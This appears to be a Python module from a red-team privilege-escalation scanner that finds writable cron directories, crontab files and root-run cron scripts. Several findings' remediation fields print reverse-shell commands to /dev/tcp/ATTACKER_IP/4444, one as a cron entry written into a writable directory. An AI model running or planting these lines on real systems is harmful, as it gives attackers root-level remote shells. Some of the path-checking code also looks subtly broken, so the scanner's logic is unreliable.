"""
Cron Job Scanner - Red Team Mode
Identifies writable cron jobs and scripts run by root
"""

import os
from typing import List
from pathlib import Path
from core.scanner import BaseScanner, Finding
from utils.file_utils import is_world_writable, find_writable_files_in_path
from config.settings import SEVERITY_CRITICAL, SEVERITY_HIGH, VECTOR_CRON, CRON_DIRS


class CronScanner(BaseScanner):
    """Scanner for cron job privilege escalation vectors"""

    def __init__(self):
        super().__init__(VECTOR_CRON)

    def scan(self) -> List[Finding]:
        """Execute cron job security scan"""
        # Check system cron directories
        self._check_cron_directories()

        # Check user crontabs
        self._check_user_crontab()

        # Check /etc/crontab
        self._check_crontab_file()

        # Check for writable scripts referenced in cron jobs
        self._check_cron_scripts()

        return self.findings

    def _check_cron_directories(self):
        """Check system cron directories for writable files"""
        for cron_dir in CRON_DIRS:
            if not os.path.exists(cron_dir):
                continue

            try:
                # Check if directory itself is writable
                if os.access(cron_dir, os.W_OK):
                    self.add_finding(
                        severity=SEVERITY_CRITICAL,
                        title=f"Writable cron directory: {cron_dir}",
                        description=f"The cron directory {cron_dir} is writable. "
                                   f"New cron jobs can be created to run commands as root.",
                        evidence=f"Directory: {cron_dir}\nWritable by current user",
                        remediation=f"Exploit: echo '* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > {cron_dir}/evil\n"
                                   f"Defense: chmod 755 {cron_dir}"
                    )

                # Check files in directory
                writable_files = find_writable_files_in_path(cron_dir)
                for file_path in writable_files:
                    self.add_finding(
                        severity=SEVERITY_CRITICAL,
                        title=f"Writable cron job: {os.path.basename(file_path)}",
                        description=f"Cron job file {file_path} is writable. "
                                   f"Can be modified to execute arbitrary commands as root.",
                        evidence=f"File: {file_path}\nWritable by current user",
                        remediation=f"Modify file to include: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
                                   f"Defense: chmod 644 {file_path}"
                    )
            except PermissionError:
                pass

    def _check_user_crontab(self):
        """Check user's crontab"""
        output = self.run_command("crontab -l 2>/dev/null")

        if output and not "no crontab" in output.lower():
            # User has a crontab - check if it contains interesting entries
            self.add_finding(
                severity=SEVERITY_HIGH,
                title="User crontab exists",
                description="Current user has a crontab. Check for scripts that run with elevated privileges.",
                evidence=f"Crontab content:\n{output[:500]}",
                remediation="Review crontab entries for exploitable scripts"
            )

    def _check_crontab_file(self):
        """Check /etc/crontab file"""
        crontab_path = "/etc/crontab"

        if os.path.exists(crontab_path):
            if os.access(crontab_path, os.W_OK):
                self.add_finding(
                    severity=SEVERITY_CRITICAL,
                    title="/etc/crontab is writable",
                    description="The system crontab file is writable. "
                               "Can add entries to run commands as root.",
                    evidence=f"File: {crontab_path}\nWritable by current user",
                    remediation="chmod 644 /etc/crontab"
                )

            # Check if readable and parse for interesting jobs
            if os.access(crontab_path, os.R_OK):
                try:
                    with open(crontab_path, 'r') as f:
                        content = f.read()
                        self._parse_crontab_content(content, crontab_path)
                except Exception:
                    pass

    def _parse_crontab_content(self, content: str, source: str):
        """Parse crontab content for potentially exploitable entries"""
        lines = content.split('\n')

        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # Check for root jobs with scripts
            if 'root' in line.lower():
                # Extract script paths
                parts = line.split()
                for part in parts:
                    if '/' in part and not part.startswith('/') == False:
                        script_path = part.strip()
                        if os.path.exists(script_path):
                            if os.access(script_path, os.W_OK):
                                self.add_finding(
                                    severity=SEVERITY_CRITICAL,
                                    title=f"Writable root cron script: {os.path.basename(script_path)}",
                                    description=f"Script {script_path} runs as root via cron and is writable.",
                                    evidence=f"Cron entry: {line}\nScript: {script_path}",
                                    remediation=f"Inject reverse shell into {script_path}"
                                )

    def _check_cron_scripts(self):
        """Check common cron script locations for writable files"""
        script_dirs = [
            "/etc/cron.d/",
            "/etc/cron.daily/",
            "/etc/cron.hourly/",
            "/etc/cron.weekly/",
            "/etc/cron.monthly/",
            "/usr/local/bin/",
            "/opt/"
        ]

        for script_dir in script_dirs:
            if os.path.exists(script_dir):
                writable = find_writable_files_in_path(script_dir)
                # Already reported above if in cron dirs
                # This catches scripts in other locations
